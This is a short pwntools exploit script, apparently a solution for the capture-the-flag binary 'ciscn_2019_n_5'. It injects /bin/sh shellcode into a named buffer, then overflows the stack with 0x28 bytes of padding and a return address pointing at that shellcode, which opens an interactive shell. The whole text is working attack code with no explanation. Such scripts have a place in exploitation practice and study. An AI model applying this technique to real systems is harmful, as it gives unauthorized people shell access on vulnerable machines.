from pwn import*
context(log_level = 'debug', arch = 'amd64', os = 'linux')
shellcode=asm(shellcraft.sh())
p=process('./ciscn_2019_n_5')
p.recvuntil(b'name\n')
p.sendline(shellcode)
p.recvuntil(b'me?\n')
name=0x601080
payload=b'a'*0x28+p64(name)
p.sendline(payload)
p.interactive()

